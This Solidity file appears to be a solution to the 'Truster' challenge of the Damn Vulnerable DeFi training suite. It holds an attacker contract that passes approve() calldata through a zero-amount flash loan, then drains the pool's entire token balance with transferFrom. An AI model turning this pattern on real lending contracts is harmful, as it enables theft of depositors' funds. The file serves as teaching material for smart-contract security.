// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

/**
 * @title TrusterLenderPool - Attacker
 * @author Valentin Staykov - https://github.com/Bludya/damn-vulnerable-def-solutions
 */

contract TrusterAttacker {

    function attack(TrusterLenderPool pool, IERC20 token, address attackerAddr) external {
        uint256 amount = token.balanceOf(address(pool));

        bytes memory approveCallData = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

        pool.flashLoan(0, attackerAddr, address(token), approveCallData);

        token.transferFrom(address(pool), attackerAddr, amount);
    }
}